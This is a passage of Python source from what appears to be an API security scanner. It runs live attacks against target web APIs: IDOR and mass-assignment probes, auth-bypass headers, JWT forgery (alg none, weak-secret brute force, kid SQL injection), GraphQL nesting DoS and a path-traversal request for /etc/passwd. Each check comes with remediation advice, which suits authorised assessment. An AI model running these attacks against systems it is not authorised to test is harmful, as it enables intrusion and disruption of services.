                await ctx.facts.add(
                    "vuln.api",
                    {"type": "method_tamper", "method": method, "url": url},
                    self.name,
                    host_id=port_obj.host_id,
                )
                if ctx.db is not None:
                    await ctx.db.insert_finding(finding)
                break  # One finding per endpoint

    # ── 2.4 Mass assignment ──────────────────────────────────────────────

    async def _test_mass_assignment(
        self,
        ctx: ModuleContext,
        session: aiohttp.ClientSession,
        sem: asyncio.Semaphore,
        url: str,
        method: str,
        body_params: list[str],
        port_obj: Port,
        findings: list[Finding],
    ) -> None:
        """Test for mass assignment by adding extra privileged fields."""
        # Build a body with legitimate params plus admin fields
        body: dict[str, Any] = {}
        for param in body_params:
            body[param] = "test"
        body.update(_MASS_ASSIGN_FIELDS)

        result = await self._fetch(
            ctx, session, sem, url,
            method=method,
            headers={"Content-Type": "application/json"},
            json_body=body,
        )
        if result is None:
            return
        status, headers, resp_body = result

        if status in (200, 201):
            # Check if any of the injected fields are reflected back
            try:
                resp_json = json.loads(resp_body)
                if isinstance(resp_json, dict):
                    reflected_fields = []
                    for field_name in _MASS_ASSIGN_FIELDS:
                        if field_name in resp_json:
                            reflected_fields.append(field_name)

                    if reflected_fields:
                        finding = Finding(
                            title=f"Mass assignment vulnerability on {url}",
                            description=(
                                f"The endpoint {url} accepts and reflects "
                                f"privileged fields in {method} requests: "
                                f"{', '.join(reflected_fields)}. An attacker "
                                f"could escalate privileges by injecting "
                                f"admin-level attributes."
                            ),
                            severity=Severity.HIGH,
                            host_id=port_obj.host_id,
                            port_id=port_obj.id,
                            module_name=self.name,
                            attack_technique_ids=self.attack_technique_ids,
                            evidence=[
                                Evidence(kind="request", data=f"{method} {url}"),
                                Evidence(kind="injected_fields",
                                         data=", ".join(reflected_fields)),
                                Evidence(kind="response", data=resp_body[:500]),
                            ],
                            remediation=(
                                "Use explicit allowlists for accepted fields. "
                                "Never bind request bodies directly to internal "
                                "models. Use DTOs or serializer allowlists."
                            ),
                            verified=True,
                        )
                        findings.append(finding)
                        await ctx.facts.add(
                            "vuln.api",
                            {"type": "mass_assignment", "url": url,
                             "fields": reflected_fields},
                            self.name,
                            host_id=port_obj.host_id,
                        )
                        if ctx.db is not None:
                            await ctx.db.insert_finding(finding)
            except (json.JSONDecodeError, ValueError):
                pass

    # ── 2.5 IDOR testing ────────────────────────────────────────────────

    async def _test_idor(
        self,
        ctx: ModuleContext,
        session: aiohttp.ClientSession,
        sem: asyncio.Semaphore,
        url: str,
        port_obj: Port,
        findings: list[Finding],
    ) -> None:
        """Test for Insecure Direct Object References by manipulating IDs."""
        # Only test URLs that look like they contain resource IDs
        id_pattern = re.compile(r"/(\d+)(?:/|$)")
        match = id_pattern.search(url)
        if not match:
            return

        original_id = match.group(1)
        original_result = await self._fetch(ctx, session, sem, url)
        if original_result is None or original_result[0] != 200:
            return

        # Try adjacent IDs
        test_ids = [str(int(original_id) + 1), str(int(original_id) - 1), "0", "1"]
        for test_id in test_ids:
            if test_id == original_id:
                continue
            test_url = url.replace(f"/{original_id}", f"/{test_id}", 1)
            result = await self._fetch(ctx, session, sem, test_url)
            if result is None:
                continue
            status, headers, body = result

            if status == 200 and len(body) > 50:
                # Both IDs returned data -- potential IDOR
                finding = Finding(
                    title=f"Potential IDOR on {url}",
                    description=(
                        f"The endpoint returns data for different resource "
                        f"IDs without additional authorization checks. "
                        f"Original ID '{original_id}' and test ID "
                        f"'{test_id}' both returned 200 OK with content. "
                        f"An attacker may enumerate and access other "
                        f"users' resources."
                    ),
                    severity=Severity.HIGH,
                    host_id=port_obj.host_id,
                    port_id=port_obj.id,
                    module_name=self.name,
                    attack_technique_ids=self.attack_technique_ids,
                    evidence=[
                        Evidence(kind="request", data=f"GET {url} (original)"),
                        Evidence(kind="request", data=f"GET {test_url} (IDOR test)"),
                        Evidence(kind="response", data=f"Both returned HTTP 200"),
                    ],
                    remediation=(
                        "Implement proper authorization checks on all "
                        "resource access. Verify the authenticated user "
                        "owns or has permission to access the requested "
                        "resource. Use UUIDs instead of sequential IDs."
                    ),
                )
                findings.append(finding)
                await ctx.facts.add(
                    "vuln.api",
                    {"type": "idor", "url": url, "test_id": test_id},
                    self.name,
                    host_id=port_obj.host_id,
                )
                if ctx.db is not None:
                    await ctx.db.insert_finding(finding)
                return

    # ── Phase 3: Auth bypass ─────────────────────────────────────────────

    async def _test_auth_bypass(
        self,
        ctx: ModuleContext,
        session: aiohttp.ClientSession,
        sem: asyncio.Semaphore,
        endpoints: list[dict[str, Any]],
        port_obj: Port,
        findings: list[Finding],
    ) -> None:
        """Test API endpoints for authentication bypass vulnerabilities."""
        auth_bypass_headers_sets: list[tuple[str, dict[str, str]]] = [
            ("no_auth", {}),
            ("empty_bearer", {"Authorization": "Bearer "}),
            ("empty_basic", {"Authorization": "Basic "}),
            ("null_bearer", {"Authorization": "Bearer null"}),
            ("admin_bearer", {"Authorization": "Bearer admin"}),
            ("internal_header", {"X-Forwarded-For": "127.0.0.1"}),
            ("internal_host", {"X-Original-URL": "/admin", "X-Forwarded-Host": "localhost"}),
        ]

        # Pick a subset of auth-required endpoints to test
        auth_endpoints = [ep for ep in endpoints if ep.get("requires_auth")]
        if not auth_endpoints:
            # If no auth info, test a sample of all endpoints
            auth_endpoints = endpoints[:5]

        for ep in auth_endpoints[:10]:  # Cap at 10 endpoints
            url = ep["url"]

            # First get the baseline (expect 401/403)
            baseline = await self._fetch(ctx, session, sem, url)
            if baseline is None:
                continue
            baseline_status = baseline[0]
            if baseline_status == 200:
                continue  # Already accessible, no auth required

            for bypass_name, bypass_headers in auth_bypass_headers_sets:
                result = await self._fetch(
                    ctx, session, sem, url,
                    headers=bypass_headers,
                )
                if result is None:
                    continue
                status, headers, body = result

                if status == 200 and baseline_status in (401, 403):
                    finding = Finding(
                        title=f"Authentication bypass via {bypass_name} on {url}",
                        description=(
                            f"The endpoint {url} returns 401/403 normally but "
                            f"returns HTTP 200 when using the '{bypass_name}' "
                            f"bypass technique. This allows unauthenticated "
                            f"access to protected resources."
                        ),
                        severity=Severity.CRITICAL,
                        host_id=port_obj.host_id,
                        port_id=port_obj.id,
                        module_name=self.name,
                        attack_technique_ids=self.attack_technique_ids,
                        evidence=[
                            Evidence(kind="baseline", data=f"GET {url} -> HTTP {baseline_status}"),
                            Evidence(kind="bypass", data=f"GET {url} with {bypass_name} -> HTTP 200"),
                            Evidence(kind="headers", data=json.dumps(bypass_headers)),
                        ],
                        remediation=(
                            "Enforce authentication on all protected endpoints. "
                            "Do not trust client-supplied headers for auth decisions. "
                            "Validate JWT tokens properly on every request."
                        ),
                        verified=True,
                    )
                    findings.append(finding)
                    await ctx.facts.add(
                        "vuln.api",
                        {"type": "auth_bypass", "method": bypass_name, "url": url},
                        self.name,
                        host_id=port_obj.host_id,
                    )
                    if ctx.db is not None:
                        await ctx.db.insert_finding(finding)
                    break  # One bypass finding per endpoint

        # JWT-specific attacks: look for tokens in responses
        await self._test_jwt_attacks(ctx, session, sem, endpoints, port_obj, findings)

    # ── JWT attacks ──────────────────────────────────────────────────────

    async def _test_jwt_attacks(
        self,
        ctx: ModuleContext,
        session: aiohttp.ClientSession,
        sem: asyncio.Semaphore,
        endpoints: list[dict[str, Any]],
        port_obj: Port,
        findings: list[Finding],
    ) -> None:
        """Test JWT-specific vulnerabilities: alg:none, weak secrets, kid injection."""
        # Try to get a JWT from a login-like endpoint
        jwt_token: str | None = None
        login_endpoints = [
            ep for ep in endpoints
            if any(kw in ep["url"].lower() for kw in ("login", "auth", "token", "signin"))
        ]

        for ep in login_endpoints[:3]:
            result = await self._fetch(
                ctx, session, sem, ep["url"],
                method="POST",
                headers={"Content-Type": "application/json"},
                json_body={"username": "admin", "password": "admin"},
            )
            if result is None:
                continue
            status, headers, body = result
            # Look for JWT patterns in response
            jwt_match = re.search(
                r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*",
                body,
            )
            if jwt_match:
                jwt_token = jwt_match.group(0)
                break
            # Also check Authorization header in response
            auth_header = headers.get("Authorization", "")
            if auth_header.startswith("Bearer eyJ"):
                jwt_token = auth_header[7:]
                break

        if not jwt_token:
            return

        # Determine a test endpoint for auth
        test_url = endpoints[0]["url"] if endpoints else None
        if not test_url:
            return

        # Attack 1: Algorithm "none"
        none_token = _forge_jwt_none(jwt_token)
        if none_token:
            result = await self._fetch(
                ctx, session, sem, test_url,
                headers={"Authorization": f"Bearer {none_token}"},
            )
            if result and result[0] == 200:
                finding = Finding(
                    title=f"JWT algorithm 'none' accepted on {test_url}",
                    description=(
                        "The server accepts JWT tokens with alg='none', "
                        "which means unsigned tokens are treated as valid. "
                        "An attacker can forge arbitrary tokens without "
                        "knowing the signing key."
                    ),
                    severity=Severity.CRITICAL,
                    host_id=port_obj.host_id,
                    port_id=port_obj.id,
                    module_name=self.name,
                    attack_technique_ids=self.attack_technique_ids,
                    evidence=[
                        Evidence(kind="jwt_attack", data="alg=none bypass"),
                        Evidence(kind="request",
                                 data=f"Bearer {none_token[:50]}..."),
                    ],
                    remediation=(
                        "Explicitly reject JWTs with alg='none'. Use a "
                        "strict allowlist of accepted algorithms (e.g., "
                        "RS256 only). Use a well-tested JWT library."
                    ),
                    verified=True,
                )
                findings.append(finding)
                await ctx.facts.add(
                    "vuln.api",
                    {"type": "jwt_none", "url": test_url},
                    self.name,
                    host_id=port_obj.host_id,
                )
                if ctx.db is not None:
                    await ctx.db.insert_finding(finding)

        # Attack 2: Expired token acceptance
        expired_token = _make_expired_jwt(jwt_token)
        if expired_token:
            result = await self._fetch(
                ctx, session, sem, test_url,
                headers={"Authorization": f"Bearer {expired_token}"},
            )
            if result and result[0] == 200:
                finding = Finding(
                    title=f"Expired JWT tokens accepted on {test_url}",
                    description=(
                        "The server accepts JWT tokens with expired 'exp' "
                        "claims. An attacker with a stolen expired token "
                        "can continue to use it indefinitely."
                    ),
                    severity=Severity.HIGH,
                    host_id=port_obj.host_id,
                    port_id=port_obj.id,
                    module_name=self.name,
                    attack_technique_ids=self.attack_technique_ids,
                    evidence=[
                        Evidence(kind="jwt_attack", data="expired token accepted"),
                        Evidence(kind="exp_claim", data="exp=1000000000 (2001-09-08)"),
                    ],
                    remediation=(
                        "Always validate the 'exp' claim in JWTs. Reject "
                        "tokens that have expired. Set reasonable token "
                        "lifetimes (15 min for access tokens)."
                    ),
                    verified=True,
                )
                findings.append(finding)
                await ctx.facts.add(
                    "vuln.api",
                    {"type": "jwt_expired", "url": test_url},
                    self.name,
                    host_id=port_obj.host_id,
                )
                if ctx.db is not None:
                    await ctx.db.insert_finding(finding)

        # Attack 3: Brute-force common secrets
        for secret in _JWT_COMMON_SECRETS:
            signed_token = _sign_jwt_hs256(jwt_token, secret)
            if signed_token is None:
                continue
            result = await self._fetch(
                ctx, session, sem, test_url,
                headers={"Authorization": f"Bearer {signed_token}"},
            )
            if result and result[0] == 200:
                finding = Finding(
                    title=f"JWT signed with weak secret '{secret}' on {test_url}",
                    description=(
                        f"The server accepts JWTs signed with the common "
                        f"secret '{secret}'. An attacker can forge tokens "
                        f"with arbitrary claims using this secret."
                    ),
                    severity=Severity.CRITICAL,
                    host_id=port_obj.host_id,
                    port_id=port_obj.id,
                    module_name=self.name,
                    attack_technique_ids=self.attack_technique_ids,
                    evidence=[
                        Evidence(kind="jwt_attack", data=f"weak secret: {secret}"),
                        Evidence(kind="algorithm", data="HS256"),
                    ],
                    remediation=(
                        "Use a strong, randomly generated secret (at least "
                        "256 bits of entropy). Prefer asymmetric algorithms "
                        "(RS256/ES256) over symmetric ones (HS256). Rotate "
                        "secrets regularly."
                    ),
                    verified=True,
                )
                findings.append(finding)
                await ctx.facts.add(
                    "vuln.api",
                    {"type": "jwt_weak_secret", "secret": secret, "url": test_url},
                    self.name,
                    host_id=port_obj.host_id,
                )
                if ctx.db is not None:
                    await ctx.db.insert_finding(finding)
                break  # One weak secret finding is sufficient

        # Attack 4: Token without signature
        parts = jwt_token.split(".")
        if len(parts) >= 3:
            nosig_token = f"{parts[0]}.{parts[1]}."
            result = await self._fetch(
                ctx, session, sem, test_url,
                headers={"Authorization": f"Bearer {nosig_token}"},
            )
            if result and result[0] == 200:
                finding = Finding(
                    title=f"JWT without signature accepted on {test_url}",
                    description=(
                        "The server accepts JWT tokens with an empty "
                        "signature component. This means the server does "
                        "not verify token integrity."
                    ),
                    severity=Severity.CRITICAL,
                    host_id=port_obj.host_id,
                    port_id=port_obj.id,
                    module_name=self.name,
                    attack_technique_ids=self.attack_technique_ids,
                    evidence=[
                        Evidence(kind="jwt_attack", data="empty signature accepted"),
                    ],
                    remediation=(
                        "Always verify JWT signatures. Use a well-tested "
                        "JWT library that rejects unsigned tokens by default."
                    ),
                    verified=True,
                )
                findings.append(finding)
                await ctx.facts.add(
                    "vuln.api",
                    {"type": "jwt_no_sig", "url": test_url},
                    self.name,
                    host_id=port_obj.host_id,
                )
                if ctx.db is not None:
                    await ctx.db.insert_finding(finding)

        # Attack 5: Kid injection
        kid_token = _make_kid_injection_jwt(jwt_token)
        if kid_token:
            result = await self._fetch(
                ctx, session, sem, test_url,
                headers={"Authorization": f"Bearer {kid_token}"},
            )
            if result and result[0] == 200:
                finding = Finding(
                    title=f"JWT kid header injection on {test_url}",
                    description=(
                        "The server is vulnerable to JWT 'kid' header "
                        "parameter injection. The 'kid' value is used "
                        "in a database query without sanitization, "
                        "allowing an attacker to control the signing key."
                    ),
                    severity=Severity.CRITICAL,
                    host_id=port_obj.host_id,
                    port_id=port_obj.id,
                    module_name=self.name,
                    attack_technique_ids=self.attack_technique_ids,
                    evidence=[
                        Evidence(kind="jwt_attack", data="kid SQL injection"),
                        Evidence(kind="kid_value",
                                 data="' UNION SELECT 'secret' -- "),
                    ],
                    remediation=(
                        "Sanitize the 'kid' header parameter. Use a "
                        "hardcoded key lookup instead of database queries. "
                        "Validate kid values against an allowlist."
                    ),
                    verified=True,
                )
                findings.append(finding)
                await ctx.facts.add(
                    "vuln.api",
                    {"type": "jwt_kid_injection", "url": test_url},
                    self.name,
                    host_id=port_obj.host_id,
                )
                if ctx.db is not None:
                    await ctx.db.insert_finding(finding)

    # ── Phase 4: CORS misconfiguration ───────────────────────────────────

    async def _test_cors(
        self,
        ctx: ModuleContext,
        session: aiohttp.ClientSession,
        sem: asyncio.Semaphore,
        base_url: str,
        port_obj: Port,
        findings: list[Finding],
    ) -> None:
        """Test for CORS misconfiguration with various origin values."""
        test_origins = [
            ("https://evil.com", "arbitrary origin"),
            ("null", "null origin"),
            ("https://api.evil.com", "subdomain-like origin"),
        ]

        # Also test wildcard subdomain matching
        parsed = urlparse(base_url)
        host = parsed.hostname or ""
        if "." in host:
            domain_parts = host.split(".")
            parent = ".".join(domain_parts[-2:])
            test_origins.append(
                (f"https://evil.{parent}", "parent domain spoof")
            )

        for origin, origin_desc in test_origins:
            result = await self._fetch(
                ctx, session, sem, base_url,
                headers={"Origin": origin},
            )
            if result is None:
                continue
            status, headers, body = result

            acao = headers.get("Access-Control-Allow-Origin", "")
            acac = headers.get("Access-Control-Allow-Credentials", "").lower()

            if origin in acao or acao == "*":
                severity = Severity.HIGH if acac == "true" else Severity.MEDIUM
                cred_note = (
                    " with credentials allowed (Access-Control-Allow-Credentials: true)"
                    if acac == "true" else ""
                )
                finding = Finding(
                    title=f"CORS misconfiguration ({origin_desc}) on {base_url}",
                    description=(
                        f"The API reflects the Origin header '{origin}' in "
                        f"Access-Control-Allow-Origin{cred_note}. "
                        f"This allows cross-origin requests from attacker-"
                        f"controlled domains, potentially leaking sensitive "
                        f"API data."
                    ),
                    severity=severity,
                    host_id=port_obj.host_id,
                    port_id=port_obj.id,
                    module_name=self.name,
                    attack_technique_ids=self.attack_technique_ids,
                    evidence=[
                        Evidence(kind="request",
                                 data=f"Origin: {origin}"),
                        Evidence(kind="response",
                                 data=f"ACAO: {acao}, ACAC: {acac}"),
                    ],
                    remediation=(
                        "Use an explicit allowlist of trusted origins. "
                        "Never reflect arbitrary origins. Never use "
                        "ACAO: * with credentials."
                    ),
                )
                findings.append(finding)
                await ctx.facts.add(
                    "vuln.api",
                    {"type": "cors", "origin": origin, "url": base_url},
                    self.name,
                    host_id=port_obj.host_id,
                )
                if ctx.db is not None:
                    await ctx.db.insert_finding(finding)
                break  # One CORS finding per service

    # ── Phase 5: Rate limit testing ──────────────────────────────────────

    async def _test_rate_limiting(
        self,
        ctx: ModuleContext,
        session: aiohttp.ClientSession,
        sem: asyncio.Semaphore,
        base_url: str,
        port_obj: Port,
        findings: list[Finding],
    ) -> None:
        """Send rapid requests to check for rate limiting."""
        test_url = base_url
        success_count = 0
        rate_limited = False
        total_requests = _RATE_LIMIT_BURST

        tasks = []
        for _ in range(total_requests):
            tasks.append(self._fetch(ctx, session, sem, test_url))

        results = await asyncio.gather(*tasks, return_exceptions=True)

        for result in results:
            if isinstance(result, Exception) or result is None:
                continue
            status = result[0]
            if status == 429:
                rate_limited = True
                break
            if status < 500:
                success_count += 1

        if not rate_limited and success_count >= total_requests * 0.9:
            finding = Finding(
                title=f"No rate limiting detected on {base_url}",
                description=(
                    f"Sent {total_requests} rapid requests to {base_url} "
                    f"and received {success_count} successful responses "
                    f"without any rate limiting (HTTP 429). The API is "
                    f"vulnerable to brute-force attacks, credential "
                    f"stuffing, and denial-of-service."
                ),
                severity=Severity.MEDIUM,
                host_id=port_obj.host_id,
                port_id=port_obj.id,
                module_name=self.name,
                attack_technique_ids=self.attack_technique_ids,
                evidence=[
                    Evidence(kind="test",
                             data=f"{total_requests} requests, "
                                  f"{success_count} successful, "
                                  f"0 rate-limited (429)"),
                ],
                remediation=(
                    "Implement rate limiting on all API endpoints. Use "
                    "a token bucket or sliding window algorithm. Return "
                    "HTTP 429 with Retry-After header when limits are "
                    "exceeded. Apply stricter limits on auth endpoints."
                ),
            )
            findings.append(finding)
            await ctx.facts.add(
                "vuln.api",
                {"type": "no_rate_limit", "url": base_url,
                 "requests": total_requests, "successes": success_count},
                self.name,
                host_id=port_obj.host_id,
            )
            if ctx.db is not None:
                await ctx.db.insert_finding(finding)

    # ── Phase 6: GraphQL-specific attacks ────────────────────────────────

    async def _fuzz_graphql(
        self,
        ctx: ModuleContext,
        session: aiohttp.ClientSession,
        sem: asyncio.Semaphore,
        graphql_url: str,
        port_obj: Port,
        findings: list[Finding],
    ) -> None:
        """Run GraphQL-specific security tests."""
        # 6.1 Full introspection
        introspection_result = await self._fetch(
            ctx, session, sem, graphql_url,
            method="POST",
            headers={"Content-Type": "application/json"},
            json_body={"query": _GRAPHQL_INTROSPECTION_QUERY},
        )

        schema_types: list[dict] = []
        mutations: list[str] = []

        if introspection_result and introspection_result[0] == 200:
            try:
                resp_json = json.loads(introspection_result[2])
                data = resp_json.get("data", {})
                schema = data.get("__schema", {})

                types = schema.get("types", [])
                if isinstance(types, list):
                    schema_types = types

                mutation_type = schema.get("mutationType")
                if mutation_type and isinstance(mutation_type, dict):
                    mutation_name = mutation_type.get("name", "Mutation")
                    for t in schema_types:
                        if t.get("name") == mutation_name and t.get("fields"):
                            mutations = [
                                f.get("name", "") for f in t["fields"]
                                if isinstance(f, dict)
                            ]

                # Introspection enabled is itself a finding
                user_types = [
                    t for t in schema_types
                    if isinstance(t, dict)
                    and not t.get("name", "").startswith("__")
                    and t.get("kind") == "OBJECT"
                ]

                finding = Finding(
                    title=f"GraphQL introspection enabled on {graphql_url}",
                    description=(
                        f"The GraphQL endpoint allows full schema "
                        f"introspection, exposing {len(user_types)} "
                        f"object types and {len(mutations)} mutations. "
                        f"An attacker can map the entire API surface "
                        f"without authentication."
                    ),
                    severity=Severity.MEDIUM,
                    host_id=port_obj.host_id,
                    port_id=port_obj.id,
                    module_name=self.name,
                    attack_technique_ids=self.attack_technique_ids,
                    evidence=[
                        Evidence(kind="types",
                                 data=", ".join(t.get("name", "?") for t in user_types[:20])),
                        Evidence(kind="mutations",
                                 data=", ".join(mutations[:20]) if mutations else "none discovered"),
                    ],
                    remediation=(
                        "Disable introspection in production. Use "
                        "persisted queries or a query allowlist. Implement "
                        "field-level authorization."
                    ),
                    verified=True,
                )
                findings.append(finding)
                if ctx.db is not None:
                    await ctx.db.insert_finding(finding)

            except (json.JSONDecodeError, ValueError, KeyError):
                pass

        # 6.2 Deep query nesting (DoS)
        nested_query = "{ __typename " + "".join(
            f"a{i}: __type(name: \"Query\") {{ name fields {{ name type {{ name "
            for i in range(12)
        ) + " name " + " } } }" * 12 + " }"

        nested_result = await self._fetch(
            ctx, session, sem, graphql_url,
            method="POST",
            headers={"Content-Type": "application/json"},
            json_body={"query": nested_query},
        )
        if nested_result:
            status, headers, body = nested_result
            if status == 200 and "errors" not in body.lower()[:200]:
                finding = Finding(
                    title=f"GraphQL deep nesting DoS on {graphql_url}",
                    description=(
                        "The GraphQL endpoint accepts deeply nested queries "
                        "(12+ levels) without depth limiting. An attacker "
                        "can craft resource-exhaustion queries that consume "
                        "excessive server memory and CPU."
                    ),
                    severity=Severity.HIGH,
                    host_id=port_obj.host_id,
                    port_id=port_obj.id,
                    module_name=self.name,
                    attack_technique_ids=self.attack_technique_ids,
                    evidence=[
                        Evidence(kind="query", data="12-level nested query accepted"),
                        Evidence(kind="response", data=f"HTTP {status}"),
                    ],
                    remediation=(
                        "Implement query depth limiting (max 5-7 levels). "
                        "Add query complexity analysis and cost limits. "
                        "Set per-query timeouts."
                    ),
                    verified=True,
                )
                findings.append(finding)
                if ctx.db is not None:
                    await ctx.db.insert_finding(finding)

        # 6.3 Batch query abuse
        batch_body = [
            {"query": "{ __typename }"},
            {"query": "{ __typename }"},
            {"query": "{ __typename }"},
            {"query": "{ __typename }"},
            {"query": "{ __typename }"},
        ]
        batch_result = await self._fetch(
            ctx, session, sem, graphql_url,
            method="POST",
            headers={"Content-Type": "application/json"},
            json_body=batch_body,
        )
        if batch_result and batch_result[0] == 200:
            try:
                batch_resp = json.loads(batch_result[2])
                if isinstance(batch_resp, list) and len(batch_resp) > 1:
                    finding = Finding(
                        title=f"GraphQL batch query abuse on {graphql_url}",
                        description=(
                            "The GraphQL endpoint accepts batched queries "
                            "(array of operations). An attacker can send "
                            "hundreds of queries in a single request to "
                            "bypass rate limiting or perform batch brute-force."
                        ),
                        severity=Severity.MEDIUM,
                        host_id=port_obj.host_id,
                        port_id=port_obj.id,
                        module_name=self.name,
                        attack_technique_ids=self.attack_technique_ids,
                        evidence=[
                            Evidence(kind="batch",
                                     data=f"Sent 5 queries, got {len(batch_resp)} responses"),
                        ],
                        remediation=(
                            "Limit the number of queries per batch request. "
                            "Apply rate limiting per query, not per HTTP "
                            "request. Disable batching if not needed."
                        ),
                    )
                    findings.append(finding)
                    if ctx.db is not None:
                        await ctx.db.insert_finding(finding)
            except (json.JSONDecodeError, ValueError):
                pass

        # 6.4 Field suggestion exploitation
        typo_query = '{ usre { id name } }'  # intentional typo "usre"
        suggestion_result = await self._fetch(
            ctx, session, sem, graphql_url,
            method="POST",
            headers={"Content-Type": "application/json"},
            json_body={"query": typo_query},
        )
        if suggestion_result and suggestion_result[0] in (200, 400):
            try:
                resp_json = json.loads(suggestion_result[2])
                errors = resp_json.get("errors", [])
                suggested_fields: list[str] = []
                for err in errors:
                    if isinstance(err, dict):
                        msg = err.get("message", "")
                        # Look for "Did you mean" suggestions
                        suggestions = re.findall(r'[Dd]id you mean ["\']?(\w+)', msg)
                        suggested_fields.extend(suggestions)
                if suggested_fields:
                    finding = Finding(
                        title=f"GraphQL field suggestions expose schema on {graphql_url}",
                        description=(
                            "The GraphQL endpoint provides field name "
                            f"suggestions in error messages: "
                            f"{', '.join(suggested_fields)}. Even with "
                            f"introspection disabled, an attacker can "
                            f"enumerate field names via typo-squatting."
                        ),
                        severity=Severity.LOW,
                        host_id=port_obj.host_id,
                        port_id=port_obj.id,
                        module_name=self.name,
                        attack_technique_ids=self.attack_technique_ids,
                        evidence=[
                            Evidence(kind="query", data=typo_query),
                            Evidence(kind="suggestions",
                                     data=", ".join(suggested_fields)),
                        ],
                        remediation=(
                            "Disable field suggestions in production GraphQL "
                            "servers. In Apollo Server, set "
                            "includeStacktraceInErrorResponses: false."
                        ),
                    )
                    findings.append(finding)
                    if ctx.db is not None:
                        await ctx.db.insert_finding(finding)
            except (json.JSONDecodeError, ValueError):
                pass

        # 6.5 Mutation testing without auth
        dangerous_mutations = [
            m for m in mutations
            if any(kw in m.lower() for kw in (
                "create", "update", "delete", "remove", "add", "set", "modify",
            ))
        ]
        for mutation_name in dangerous_mutations[:5]:
            mutation_query = f'mutation {{ {mutation_name} }}'
            mut_result = await self._fetch(
                ctx, session, sem, graphql_url,
                method="POST",
                headers={"Content-Type": "application/json"},
                json_body={"query": mutation_query},
            )
            if mut_result is None:
                continue
            status, headers, body = mut_result
            if status == 200:
                try:
                    resp_json = json.loads(body)
                    # If there are no auth errors, the mutation may be unprotected
                    errors = resp_json.get("errors", [])
                    has_auth_error = any(
                        "auth" in str(e).lower()
                        or "permission" in str(e).lower()
                        or "forbidden" in str(e).lower()
                        or "unauthorized" in str(e).lower()
                        for e in errors
                    )
                    if not has_auth_error and "data" in resp_json:
                        finding = Finding(
                            title=(
                                f"GraphQL mutation '{mutation_name}' "
                                f"accessible without auth on {graphql_url}"
                            ),
                            description=(
                                f"The mutation '{mutation_name}' can be "
                                f"executed without authentication. This "
                                f"may allow unauthorized data modification."
                            ),
                            severity=Severity.HIGH,
                            host_id=port_obj.host_id,
                            port_id=port_obj.id,
                            module_name=self.name,
                            attack_technique_ids=self.attack_technique_ids,
                            evidence=[
                                Evidence(kind="mutation", data=mutation_query),
                                Evidence(kind="response", data=body[:500]),
                            ],
                            remediation=(
                                "Implement authorization checks on all "
                                "mutations. Use middleware or decorators "
                                "to enforce auth before resolver execution."
                            ),
                        )
                        findings.append(finding)
                        if ctx.db is not None:
                            await ctx.db.insert_finding(finding)
                except (json.JSONDecodeError, ValueError):
                    pass

    # ── Phase 7: Response analysis ───────────────────────────────────────

    async def _analyze_responses(
        self,
        ctx: ModuleContext,
        session: aiohttp.ClientSession,
        sem: asyncio.Semaphore,
        base_url: str,
        endpoints: list[dict[str, Any]],
        port_obj: Port,
        findings: list[Finding],
    ) -> None:
        """Analyze API responses for information leakage and misconfigurations."""
        # Sample a few endpoints for response analysis
        sample_urls = [base_url]
        for ep in endpoints[:10]:
            if ep["url"] not in sample_urls:
                sample_urls.append(ep["url"])

        for url in sample_urls[:15]:
            result = await self._fetch(ctx, session, sem, url)
            if result is None:
                continue
            status, headers, body = result

            # 7.1 Verbose error messages
            await self._check_error_disclosure(
                ctx, url, status, body, port_obj, findings,
            )

            # 7.2 Version disclosure in headers
            self._check_version_headers(url, headers, port_obj, findings)

            # 7.3 Missing security headers
            self._check_api_security_headers(url, headers, port_obj, findings)

            # 7.4 Sensitive data in response
            await self._check_sensitive_data(
                ctx, url, body, port_obj, findings,
            )

        # Also trigger error responses for deeper analysis
        error_urls = [
            f"{base_url}/api/nonexistent_endpoint_404_test",
            f"{base_url}/api/v1/../../../etc/passwd",
            f"{base_url}/api/v1/users/0",
        ]
        for url in error_urls:
            result = await self._fetch(ctx, session, sem, url)
            if result is None:
                continue
            status, headers, body = result
            await self._check_error_disclosure(
                ctx, url, status, body, port_obj, findings,
            )

    async def _check_error_disclosure(
        self,
        ctx: ModuleContext,
        url: str,
        status: int,
        body: str,
        port_obj: Port,
        findings: list[Finding],
    ) -> None:
        """Check for verbose error messages that leak implementation details."""
        if status < 400:
            return

        disclosed_info: list[str] = []
        for pattern, desc in _ERROR_PATTERNS:
            if pattern.lower() in body.lower():
                disclosed_info.append(desc)

        # Check for internal IPs
        internal_ips = _INTERNAL_IP_PATTERN.findall(body)
        if internal_ips:
            disclosed_info.append(f"Internal IP(s): {', '.join(set(internal_ips[:5]))}")

        if disclosed_info:
            finding = Finding(
                title=f"Verbose error disclosure on {url}",
                description=(
                    f"The API error response (HTTP {status}) reveals "
                    f"sensitive implementation details: "
                    f"{'; '.join(disclosed_info)}. This information "
                    f"helps attackers understand the backend technology "
                    f"and identify specific vulnerabilities."
                ),
                severity=Severity.MEDIUM,
                host_id=port_obj.host_id,
                port_id=port_obj.id,
                module_name=self.name,
                attack_technique_ids=self.attack_technique_ids,
                evidence=[
                    Evidence(kind="url", data=url),
                    Evidence(kind="status", data=str(status)),
                    Evidence(kind="disclosure",
                             data="; ".join(disclosed_info)),
                    Evidence(kind="body_sample", data=body[:500]),
                ],
                remediation=(
                    "Return generic error messages in production. Disable "
                    "debug mode and stack traces. Log detailed errors "
                    "server-side only. Never expose internal IPs or paths."
                ),
            )
            findings.append(finding)
            await ctx.facts.add(
                "vuln.api",
                {"type": "error_disclosure", "url": url,
                 "details": disclosed_info},
                self.name,
                host_id=port_obj.host_id,
            )
            if ctx.db is not None:
                await ctx.db.insert_finding(finding)

    def _check_version_headers(
        self,
        url: str,
        headers: dict[str, str],
        port_obj: Port,
        findings: list[Finding],
    ) -> None:
        """Check for version information in HTTP response headers."""
        disclosure_headers = [
            "Server", "X-Powered-By", "X-AspNet-Version",
            "X-AspNetMvc-Version", "X-Runtime", "X-Version",
            "X-API-Version",
        ]

        for header_name in disclosure_headers:
            value = headers.get(header_name)
            if value and any(ch.isdigit() for ch in value):
                finding = Finding(
                    title=f"Version disclosed via {header_name} on {url}",
                    description=(
                        f"The header '{header_name}: {value}' reveals "
                        f"version information that aids attackers in "
                        f"fingerprinting the technology stack."
                    ),
                    severity=Severity.LOW,
                    host_id=port_obj.host_id,
                    port_id=port_obj.id,
                    module_name=self.name,
                    attack_technique_ids=self.attack_technique_ids,
                    evidence=[Evidence(
                        kind="http_header",
                        data=f"{header_name}: {value}",
                    )],
                    remediation=(
                        f"Remove or suppress the {header_name} header "
